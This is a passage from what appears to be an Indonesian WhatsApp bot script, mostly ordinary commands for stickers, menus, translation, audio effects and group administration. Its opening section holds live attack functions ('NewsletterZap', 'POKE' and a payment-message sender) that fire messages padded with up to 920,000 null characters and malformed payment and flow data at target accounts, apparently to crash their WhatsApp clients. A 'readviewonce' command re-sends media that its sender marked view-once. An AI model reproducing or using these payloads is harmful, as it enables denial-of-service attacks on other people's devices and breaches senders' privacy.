									"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\k${VxO},\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
								}],
								"messageParamsJson": '\0'.repeat(10000),
							}
						}
					}
				}
			}), {});
			ptz.relayMessage(LockJids, messageContent.message, {
				'messageId': messageContent.key.id
			});
		}
		const VxO = "🔥⃰͜͡⭑𝐕𝐱͢𝐎⭑͜͡🔥⃰" + "\u0000".repeat(50000)
		async function NewsletterZap(LockJids) {
			var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						"newsletterAdminInviteMessage": {
							"newsletterJid": `120363298524333143@newsletter`,
							"newsletterName": "🚫⃰͜͡⭑𝐓𝐝͢𝐗⭑͜͡🚫⃰" + "\u0000".repeat(920000),
							"jpegThumbnail": "",
							"caption": `𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉`,
							"inviteExpiration": Date.now() + 1814400000
						}
					}
				}
			}), {
				'userJid': LockJids
			});
			await ptz.relayMessage(LockJids, messageContent.message, {
				'participant': {
					'jid': LockJids
				},
				'messageId': messageContent.key.id
			});
		}

	async function POKE(LockJids, QUOTED) {
			var etc = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				interactiveMessage: {
					header: {
						title: "🩸⃟༑⌁⃰𝐙͈𝐲𝐫͢𝐞𝐧 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
						hasMediaAttachment: true,
						...(await prepareWAMessageMedia({
							image: {
								url: "https://telegra.ph/file/e8c1aee03b13f008ff65d.jpg"
							}
						}, {
							upload: ptz.waUploadToServer
						}))
					},
					
  "body": {
    "text": "Galaksi"
  },
  "footer": {
    "text": " Mesage"
  },
  "nativeFlowMessage": {
    "buttons": [
      {
        "name": "galaxy_message",
        "buttonParamsJson": "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"Fizzxy Dev is Here ϟ\",\"screen_1_DatePicker_1\":\"\",\"screen_1_TextInput_2\":\"Xcoders By Fizzxy\",\"screen_1_TextInput_3\":\"\",\"screen_0_TextInput_0\":\"Fizzxy Developer\",\"screen_0_TextInput_1\":\"Fizzxy Develoepr\",\"screen_0_Dropdown_2\":\"Fizzxy Developer\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\".\"}"
      }
    ],
    "messageParamsJson": ""
  }
				}
			}), {
				userJid: LockJids,
				quoted: QUOTED
			});
			await ptz.relayMessage(LockJids, etc.message, {
				participant: {
					jid: LockJids
				},
				messageId: etc.key.id
			});
		}
	//func MediaFire 
	async function getFileTypeFromUrl(url) {
  const ext = path.extname(url).toLowerCase();
  switch (ext) {
    case '.zip':
      return 'application/zip';
    case '.pdf':
      return 'application/pdf';
    case '.jpg':
    case '.jpeg':
      return 'image/jpeg';
    case '.png':
      return 'image/png';
    case '.gif':
      return 'image/gif';
    case '.mp3':
      return 'audio/mpeg';
    case '.ogg':
      return 'audio/ogg';
    case '.wav':
      return 'audio/wav';
    case '.mp4':
      return 'video/mp4';
    case '.mkv':
      return 'video/x-matroska';
    case '.webm':
      return 'video/webm';
    default:
      return;
  }
}
/*============= ANTI MENU =====================*/
    // Anti Link
if (isAntiLink) {
if (budy.match(`https://`)) {
m.reply(`*「 GROUP LINK DETECTOR 」*\n\nSepertinya kamu mengirimkan link, untuk mengantisipasi phising kami akan menghapusnya!`)
if (!isBotAdmins) return m.reply(`Anjir lupa gw bukan admin`)
let gclink = (`https://chat.whatsapp.com/`+await ptz.groupInviteCode(m.chat))
await ptz.sendMessage(m.chat, { delete: m.key })
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return //m.reply(`Gajadi, Karena kamu ngirim link group ini`)
if (isAdmins) return //m.reply(`Gajadi, Kamu admin`)
if (isPrem) return //m.reply(`Gajadi, Kamu ownerku`)
/*await ptz.sendMessage(m.chat, {
delete: {
remoteJid: m.chat,
fromMe: false,
id: m.key.id,
participant: m.key.participant
}
})*/
//ptz.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
    ptz.sendMessage(m.chat, { delete: m.key })
}
}
if (isAntiLink2) {
if (budy.match(`tiktok.com`)) {
m.reply(`*「 GROUP LINK DETECTOR 」*\n\nSepertinya kamu mengirimkan link tiktok, maaf kamu akan di kick`)
if (!isBotAdmins) return m.reply(`Anjir lupa gw bukan admin`)
if (isAdmins) return m.reply(`Gajadi, kamu admin`)
if (isPrem) return m.reply(`Gajadi, kamu owner ku`)
await ptz.sendMessage(m.chat, {
delete: {
remoteJid: m.chat,
fromMe: false,
id: m.key.id,
participant: m.key.participant
}
})
ptz.groupParticipantsUpdate(m.chat, [m.sender], 'delete')
}
}
	async function luminai(content, prompt, user) {
  function generateRandomUserId() {
    return 'user-' + Math.floor(Math.random() * 10000);
}
let userId = generateRandomUserId();
console.log(`Generated User ID: ${userId}`);
    try {
        const response = await axios.post('https://luminai.my.id/', { content, prompt, user });
        return response.data;
    } catch (error) {
        console.error(error);
        throw error;
    }
}   
    //batas
    let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
reply(`Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
}
if (global.db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
reply(`
Telah Kembali Dari Afk ${user.afkReason ? ' Selama ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}
    //biar gk spam chat
    if (!m.isGroup && !isPrem && !isBot) {
        	if (command){
            return kreply(` Halo sobat! Karena Kami Ingin Mengurangi Spam, Silakan Gunakan Bot di Grup Chat !\n\nJika Anda mengalami masalah silakan chat pemilik wa.me/${global.owner}\n\nSaluran: ${global.saluran}\nGroup Chat: ${group}`)
            }
        }
    
switch(command) {
//=================================================//
        case 'daftar':{
let Reg = /\|?(.*)([.|] *?)([0-9]*)$/i;
	let user = global.db.data.users[m.sender];
	if (user.registered === true) return reply(`Kamu telah terdaftar dalam database, ketik *.unreg ⧼sn⧽* untuk menghapus datamu.`);
	if (!Reg.test(text)) return reply(`format yang kamu masukan salah, *daftar ⧼nama.umur⧽*`);
	let [_, name, splitter, age] = text.match(Reg);
	if (!name) return reply('Harap masukkan namamu');
	if (!age) return reply('Harap masukkan umurmu');
	age = parseInt(age);
	user.name = name.trim();
	user.age = age;
	user.regTime = +new Date();
	user.registered = true;
	let sn = createHash('md5').update(m.sender).digest('hex');

	user.money = getRandomInt(10, 1000);
	user.limit = getRandomInt(10, 20);
	user.exp = getRandomInt(1000, 1000);

	let lucuu =
			`
╭  • *S u c c e s s f u l l y*
│  ◦ Name: ${name}
│  ◦ Age: ${age}
│  ◦ Money: ${user.money}
│  ◦ Limit: ${user.limit}
│  ◦ Exp: ${user.exp}
╰  Ketik *.ceksn* untuk mendapatkan 
serial number milikmu`

await ptz.sendMessage(m.chat, {
text: lucuu,
contextInfo: {
externalAdReply: {  
title: botname,
body: hariini,
thumbnailUrl: `https://telegra.ph/file/1d681780e96553bf8d771.jpg`,
sourceUrl: saluran,
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
}
break
case 'unreg': {
let user = global.db.data.users[m.sender]
  	if (user.registered === false) return reply(mess.notregist);
  if (!args[0]) return reply('*example*: .unreg 90259a21exxxxxx')
  let sn = createHash('md5').update(m.sender).digest('hex')
  if (args[0] !== sn) return reply('Serial number yang kamu masukkan salah!')

  user.registered = false
  reply(`Berhasil menghapus datamu, sekarang kamu tidak terdaftar lagi.`)
}
break
case 'mysn': case 'ceksn': case 'sn': {
let user = global.db.data.users[m.sender]
	if (user.registered === false) return reply(mess.notregist);
const createHash = require("crypto");
let sn = crypto.createHash('md5').update(m.sender).digest('hex');
reply(`${sn}`)
}
break
        case 'hdvid2' :
case 'vidhd' : {
  m.reply('_Proses.... mungkin membutuhkan waktu yang lumayan lama mohon tunggu aja sekitar 4-8 menit')
  HDvideo()
}
break
        case 'mennuu':
       //let asu = fs.readFileSync("./database/base/image/.Zarxios.png")
        ptz.sendMessage(m.chat, {
            document: fs.readFileSync("./package.json"),
            fileName: `𝗖𝘆𝘆𝘅𝗲𝗿𝗼 𝗔𝘀𝗶𝘀𝘀𝘁𝗲𝗻`,
            fileLength: new Date(),
            pageCount: "2024",
            caption: menunye,        
            mimetype: /*'application/vnd.openxmlformats-officedocument.wordprocessingml.document',*/
            'application/msword',
            Thumbnail: /*'https://telegra.ph/file/bd1696af2ff806ad5f06a.jpg',*/ fs.readFileSync('./Zarxios.png'),
      contextInfo: {
      externalAdReply: {
      title: `𝗖𝗼𝗽𝘆𝗿𝗶𝗴𝗵𝘁 𝟮𝟬𝟮𝟰 - 𝗖𝘆𝘆𝘅𝗲𝗿𝗼`,
      body: `Time: ${time2}`,
      thumbnailUrl: 'https://telegra.ph/file/bd1696af2ff806ad5f06a.jpg//',//https://telegra.ph/file/f29840d8351a6d9460d7a.jpg', //'https://telegra.ph/file/6b4a385416a615764b653.jpg',//https://telegra.ph/file/bd1696af2ff806ad5f06a.jpg
      sourceUrl: null,
      mediaType: 1,
      renderLargerThumbnail: true, 
        },
        forwardingScore: 10,
        isForwarded: true,
        mentionedJid: [m.sender],
        businessMessageForwardInfo: {
            businessOwnerJid: `6285224079032@s.whatsapp.net`
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: '120363310531380313@newsletter',
            serverMessageId: 1,
            newsletterName: `pp`
        }
    }
}, { quoted: { key: { participant: '0@s.whatsapp.net', remoteJid: "0@s.whatsapp.net" }, message: { conversation: '[ Projects Everdad ]' }}}); 
        break
        /**case 'tourlll':
//if ('!text') return reply('reply media')
reply(mess.wait)
        
let q = m.quoted || m
const media = await q.download(true)
    const fileSizeInBytes = fs.statSync(media).size    
    if (fileSizeInBytes === 0) {
      await m.reply("File kosong")
      await fs.promises.unlink(media)
      return
    }   
    if (fileSizeInBytes > 1073741824) {
      await m.reply("File terlalu besar, maksimal ukuran adalah 1 GB")
      await fs.promises.unlink(media)
      return
    }    
    const { files } = await uploadUguu(media)
    const caption = `*Link:*\n${files[0]?.url}`
    await m.reply(caption)
  /* catch (e) {
    await m.reply(`${e}`)
  }*/
    
    
//break
	case 'menu': {
		ptz.sendMessage(m.chat, {
        document: fs.readFileSync("./Dich.png"),
        fileName: `${ucapanWaktu}`,
        mimetype: "image/png",
        fileLength: fs.statSync("./Dich.png").size,
        jpegThumbnail: /*fs.readFileSync("./Dich.png"),*/ fkethmb,
        caption: menunye1,
        contextInfo: {
            isForwarded: true,
            mentionedJid: [m.sender],
            businessMessageForwardInfo: {
                businessOwnerJid: "6281998279777@s.whatsapp.net"
            },
            forwardedNewsletterMessageInfo: {
                newsletterName: `${botname} || create by ${ownername}`,
                newsletterJid: "120363310531380313@newsletter"
            },
            externalAdReply: {
                title: botname,
                body: 'ᴛʜᴇ ɪɴᴄʟᴜᴅᴇᴅꜱ ꜰᴏʀ ᴊᴀᴠᴀꜱᴄʀɪᴘᴛ',
                thumbnailUrl: "https://files.catbox.moe/cja649.jpg",
                sourceUrl: youtube,
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, { quoted: m });
	}
		break
case "menuall":{
    let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
const tek = ` ʜᴀʟᴏ @${m?.sender.split("@")[0]} ${ucapanWaktu}\nɪɴɪ ᴀᴅᴀʟᴀʜ ʙᴀꜱᴇ ꜱᴄʀɪᴘᴛ ʙᴏᴛ ᴡʜᴀᴛꜱᴀᴘᴘ

_*Owner Menu*_
┌ ◦ $
│ ◦ =>
└ ◦ >

_*Sticker Menu*_
┌ ◦ ${prefix}sticker
│ ◦ ${prefix}cls
│ ◦ ${prefix}smeme 
└ ◦ ${prefix}qc

_*Tools Menu*_
┌ ◦ ${prefix}remini
│ ◦ ${prefix}tts
│ ◦ ${prefix}readvo
│ ◦ ${prefix}tr
│ ◦ ${prefix}jarak
│ ◦ ${prefix}kalkulator
└ ◦ ${prefix}get

_*Ai Menu*_
┌ ◦ ${prefix}ai
│ ◦ ${prefix}bingimg-2d
│ ◦ ${prefix}gemini
└ ◦ ${prefix}gemini-img

_*Main Menu*_
┌ ◦ ${prefix}disk
└ ◦ ${prefix}ping

_*Voice Menu*_
┌ ◦ ${prefix}bass
│ ◦ ${prefix}blown
│ ◦ ${prefix}deep
│ ◦ ${prefix}earrape
│ ◦ ${prefix}fast
│ ◦ ${prefix}fat
│ ◦ ${prefix}nightcore
│ ◦ ${prefix}reverse
│ ◦ ${prefix}robot
│ ◦ ${prefix}slow
│ ◦ ${prefix}smooth
│ ◦ ${prefix}tupai
└ ◦ ${prefix}smooth

_*Group Menu*_
┌ ◦ ${prefix}add
│ ◦ ${prefix}kick
│ ◦ ${prefix}promote
└ ◦ ${prefix}demote
`
/*ptz.sendMessage(m?.chat,{text:tek,mentions:[m?.sender]},{quoted:m})*/
	/*ptz.sendMessage(m.chat, {
                        text: tek,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: `- Time : ${time2}`,
                                thumbnailUrl: 'https://pomf2.lain.la/f/l9ji9vah.jpg',
                                sourceUrl: saluran,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }    
                    },
               { quoted: zyn })*/
		ptz.sendMessage(m.chat, {
        document: fs.readFileSync("./Dich.png"),
        fileName: `${ucapanWaktu}`,
        mimetype: "image/png",
        fileLength: fs.statSync("./Dich.png").size,
        jpegThumbnail: /*fs.readFileSync("./Dich.png"),*/ fkethmb,
        caption: menunye1,
        contextInfo: {
            isForwarded: true,
            mentionedJid: [m.sender],
            businessMessageForwardInfo: {
                businessOwnerJid: "6281998279777@s.whatsapp.net"
            },
            forwardedNewsletterMessageInfo: {
                newsletterName: ownername,
                newsletterJid: "120363310531380313@newsletter"
            },
            externalAdReply: {
                title: botname,
                body: 'ᴛʜᴇ ɪɴᴄʟᴜᴅᴇᴅꜱ ꜰᴏʀ ᴊᴀᴠᴀꜱᴄʀɪᴘᴛ',
                thumbnailUrl: "https://files.catbox.moe/cja649.jpg",
                sourceUrl: youtube,
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, { quoted: zyn });
	ptz.sendMessage(m.chat, {audio: b, mimetype: "audio/mpeg", ptt: true, contextInfo: {
isForwarded: true, 
mentionedJid: [m.sender],
businessMessageForwardInfo: { 
businessOwnerJid: global.idch
}, 
forwardedNewsletterMessageInfo: {
newsletterName: `${botname}`,
newsletterJid: global.idch}
}},{quoted: fpayment})
               }                 
break
//=================================================//
case "disk":{
    let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
exec('cd && du -h --max-depth=1', (err, stdout) => {
if (err) return m?.reply(`${err}`)
if (stdout) return m?.reply(stdout)
})
}
break
//=================================================//
case "add":{
if (m?.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
if (!text && !m?.quoted) m?.reply('masukkan nomor yang ingin di tambahkan')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ptz.groupParticipantsUpdate(m?.chat, [users], 'add').catch(console.log)
}
break
//=================================================//
case "kick":{
if (m?.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
if (!text && !m?.quoted) m?.reply('masukkan nomor yang ingin di kick')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ptz.groupParticipantsUpdate(m?.chat, [users], 'remove').catch(console.log)
}
break
//=================================================//
case "promote":{
if (m?.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
if (!text && !m?.quoted) m?.reply('masukkan nomor yang ingin di promote')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ptz.groupParticipantsUpdate(m?.chat, [users], 'promote').catch(console.log)
}
break
//=================================================//
case "demote":{
if (m?.isGroup && !isAdmins && !isGroupOwner && isBotAdmins) return
if (!text && !m?.quoted) m?.reply('masukkan nomor yang ingin di demote')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ptz.groupParticipantsUpdate(m?.chat, [users], 'demote').catch(console.log)
}
break
//=================================================//
case "aiq":{
    let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
if (!text) return m?.reply("mau nanya apa sama naw")
let { data } = await axios.get("https://www.putz.my.id/api/ai?type=hercai&q=" + text)
m?.reply(data.result)
}
break
//=================================================//
case "gemini-img":{
    let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
if (!quoted) return m?.reply(`Balas Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return m?.reply("hanya support gambar")
let media = await ptz.downloadAndSaveMediaMessage(qmsg)
let urlgambar = await TelegraPH(media)
let { data } = await axios.get("https://gmni.vercel.app/api/img?imageUrl="+ urlgambar +"&prompt=" + text)
m?.reply(data.text)
}
break
//=================================================//
case "gemini":{
   let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
if (!text) return m?.reply("mau nanya apa sama naw")
let { data } = await axios.get("https://gmni.vercel.app/api/ask?text=" + text)
m?.reply(data.text)
}
break
//=================================================//
case "ocr":{
    let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
let q = m.quoted ? m.quoted : m
let mime = (q.msg || q).mimetype || ''
if (!mime) return m.reply(`balas gambar dengan perintah .ocr`)
if (!/image\/(jpe?g|png)/.test(mime)) return m.reply(`_*jenis ${mime} tidak didukung!*_`)
const ocrapi = require("ocr-space-api-wrapper")
let img = await ptz.downloadAndSaveMediaMessage(q)
let url = await TelegraPH(img)
let hasil = await ocrapi.ocrSpace(url)
 await m.reply(hasil.ParsedResults[0].ParsedText)
}
break
//=================================================//
case "stickers":{
    let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
if (!text) return m.reply(`Ex : ${prefix + command} kucing`);
const anu = await stickersearch(text);
const shuffledStickers = anu.sticker.sort(() => Math.random() - 0.5);
const randomStickers = shuffledStickers.slice(0, 10);

if (randomStickers.length > 0) {
for (let i = 0; i < randomStickers.length; i++) {
try {
await new Promise(resolve => setTimeout(resolve, i * 6000));
await ptz.sendImageAsSticker(m?.chat, randomStickers[i], m, {
packname: global.packname,
author: global.author
});
} catch (error) {
console.error(`Error sending file: ${error.message}`);
await m?.reply(`Failed to send sticker *(${i + 1}/${randomStickers.length})*`);
}
}
}}
break
//=================================================//
case "tr":{
    let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
let lang, text
if (args.length >= 2) {
lang = args[0] ? args[0] : 'id', text = args.slice(1).join(' ')
} else if (m?.quoted && m?.quoted.text) {
lang = args[0] ? args[0] : 'id', text = m?.quoted.text
} else throw `Ex: ${usedPrefix + command} id hello i am robot`
const translate = require('@vitalets/google-translate-api')
let res = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null)
if (!res) return m?.reply(`Error : Bahasa"${lang}" Tidak Support`)
m?.reply(`*Terdeteksi Bahasa:* ${res.from?.language.iso}\n*Ke Bahasa:* ${lang}\n\n*Terjemahan:* ${res.text}`.trim())
}
break
//=================================================//
case 'ss': case 'ssweb':{
    let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
if (!/^https?:\/\//.test(text)) return m?.reply('Awali *URL* dengan http:// atau https://')
let krt = await ssweb(text)
ptz.sendMessage(m.chat,{image: krt.result, caption: "Done"},{quoted:m})
}
break
//=================================================//
case "kalkulator":{
    let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
 val = text
.replace(/[^0-9\-\/+*×÷πEe()piPI/]/g, '')
.replace(/×/g, '*')
.replace(/÷/g, '/')
.replace(/π|pi/gi, 'Math.PI')
.replace(/e/gi, 'Math.E')
.replace(/\/+/g, '/')
.replace(/\++/g, '+')
.replace(/-+/g, '-')
let format = val
.replace(/Math\.PI/g, 'π')
.replace(/Math\.E/g, 'e')
.replace(/\//g, '÷')
.replace(/\*×/g, '×')
try {
console.log(val)
let result = (new Function('return ' + val))()
if (!result) throw result
m?.reply(`*${format}* = _${result}_`)
} catch (e) {
if (e == undefined) return m?.reply('Isinya?')
m?.reply('Format salah, hanya 0-9 dan Simbol -, +, *, /, ×, ÷, π, e, (, ) yang disupport')
}
}
break
//=================================================//
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':{
if (!qmsg) return m.reply("reply audio nya")
try {
    let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
let set
if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
if (/earrape/.test(command)) set = '-af volume=12'
if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
if (/reverse/.test(command)) set = '-filter_complex "areverse"'
if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
if (/audio/.test(mime)) {
let media = await ptz.downloadAndSaveMediaMessage(qmsg)
let ran = pickRandom('.mp3')
exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return m.reply(err)
let buff = fs.readFileSync(ran)
ptz.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
} else m.reply(`Reply to the audio you want to change with a caption *${prefix + command}*`)
} catch (e) {
console.log(e)
m.reply('error')
}}
break
//=================================================//
case "jarak":{
    let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
var [from, to] = text.split`|`
if (!(from && to)) return m.reply(`Ex: ${prefix + command} jakarta|bandung`)
var data = await jarak(from, to)
if (data.img) return ptz.sendMessage(m?.chat, { image: data.img, caption: data.desc }, { quoted: m })
else m?.reply(data.desc)
}
break
//=================================================//
case 'cls': {
    let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
if (!m?.quoted) return m?.reply('Reply with a sticker!')
let stiker = false
try {
let [packname, ...author] = text.split('|')
author = (author || []).join('|')
let mime = m?.quoted.mimetype || ''
if (!/webp/.test(mime)) throw 'Reply with a sticker!'
let img = await m?.quoted.download()
if (!img) throw 'Failed to download sticker!'
stiker = await addExif(img, packname || global.packname, author || global.author )
} catch (e) {
console.error(e)
if (Buffer.isBuffer(e)) stiker = e
else throw 'An error occurred: ' + e
} finally {
if (stiker) ptz.sendFile(m?.chat, stiker, 'wms.webp', '', m, false, { asSticker: true })
else throw 'Conversion failed'
}
}
break 
//=================================================//
case 'tts':{
if (!text) return m?.reply(`[ ! ] ${prefix}${command} halo world`)
 const a = await (await axios.post("https://gesserit.co/api/tiktok-tts", { text: text, voice: "id_001" }, { headers: { Referer: "https://gesserit.co/tiktok", "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36" ,responseType: "arraybuffer"}})).data
const b = Buffer.from(a.audioUrl)
ptz.sendMessage(m?.chat, { audio: Buffer.from(a.audioUrl.split("base64,")[1],"base64"), mimetype: "audio/mpeg" })
}
break
//=================================================//
case 'hd': case 'remini':{
    let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
if (!quoted) return m?.reply(`Balas Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return m?.reply("hanya support gambar")
let media = await quoted.download()
const This = await remini(media, "enhance");
ptz.sendFile(m?.chat, This, "", "Done", m);
}
break
//=================================================//
case 'tiktokk':
case 'tttt': {
    let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
if (args.length == 0) return m.reply(`Example: ${prefix + command} link lu`)
let res = await tiktok(`${args[0]}`)
ptz.sendMessage(m.chat, { video: { url: res.nowm }, caption: res.title, fileName: `tiktok.mp4`, mimetype: 'video/mp4' }).then(() => {
ptz.sendMessage(m.chat, { audio: { url: res.audio }, fileName: `tiktok.mp3`, mimetype: 'audio/mp4' })
})
}
break
//=================================================//
case "get": {
    let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
if (!/^https?:\/\//.test(text)) return m?.reply('Awali *URL* dengan http:// atau https://')
let linknyaurl = await shorturl(text)
let _url = new URL(text)
let url = `${_url.origin}${_url.pathname}${_url.search}`;
let res = await fetch(url)
if (res.headers.get('content-length') > 100 * 1024 * 1024 * 1024) {
delete res
throw `Content-Length: ${res.headers.get('content-length')}`
}
if (!/text|json/.test(res.headers.get('content-type'))) return ptz.sendFile(m?.chat, url, 'file', `*Link:* ${linknyaurl}\n\n2024 © PutuOfc`, m)
let txt = await res.buffer()
try {
txt = util.format(JSON.parse(txt + ''))
} catch (e) {
txt = txt + ''
} finally {
m?.reply(txt.slice(0, 65536) + '')
}
}
break
//=================================================//
case 'rvo': case 'readviewonce': {
    let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
if (!m?.quoted) return m?.reply('reply gambar/video yang ingin Anda lihat')
if (m?.quoted.mtype !== 'viewOnceMessageV2') return m?.reply('Ini bukan pesan view-once.')
let msg = m?.quoted.message
let type = Object.keys(msg)[0]
const { downloadContentFromMessage } = require('@whiskeysockets/baileys')
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
let buffer = Buffer.from([])
for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk])
}
if (/video/.test(type)) {
return ptz.sendFile(m?.chat, buffer, 'media.mp4', msg[type].caption || '', m)
} else if (/image/.test(type)) {
return ptz.sendFile(m?.chat, buffer, 'media.jpg', msg[type].caption || '', m)
}
}
break
//=================================================//
case 'qc': {
    let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
const { quote } = require('./lib/quote.js')
let text
if (args.length >= 1) {
text = args.slice(0).join(" ")
} else if (m?.quoted && m?.quoted.text) {
text = m?.quoted.text
} else m?.reply("Input teks atau reply teks yang ingin di jadikan quote!")
if (!text) return m?.reply('masukan text')
if (text.length > 30) return m?.reply('Maksimal 30 Teks!')
let ppnyauser = await await ptz.profilePictureUrl(m?.sender, 'image').catch(_=> 'https://telegra.ph/file/6880771a42bad09dd6087.jpg')
const rest = await quote(text, pushname, ppnyauser)
ptz.sendImageAsSticker(m?.chat, rest.result, m, { packname: `${global.packname}`, author: `${global.author}`})
}
break
//=================================================//
case 'sticker':
case 'stiker':
case 's': {
if (!quoted) return m?.reply(`Balas Video/Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await ptz.sendImageAsSticker(m?.chat, media, m, {
packname: global.packname,
author: global.author
})
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return m?.reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await ptz.sendVideoAsSticker(m?.chat, media, m, {
packname: global.packname,
author: global.author
})
await fs.unlinkSync(encmedia)
} else {
return m?.reply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
break
//=================================================//
case 'smeme': {
    let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
if (!/image/.test(mime)) return m?.reply(respond)
if (!text) return m?.reply(respond)
try {
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
let dwnld = await ptz.downloadAndSaveMediaMessage(qmsg)
let fatGans = await TelegraPH(dwnld)
let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(bawah)}/${encodeURIComponent(atas)}.png?background=${fatGans}`
let FaTiH = await ptz.sendImageAsSticker(m?.chat, smeme, m, { packname: global.packname, author: global.auhor })
await fs.unlinkSync(FaTiH)
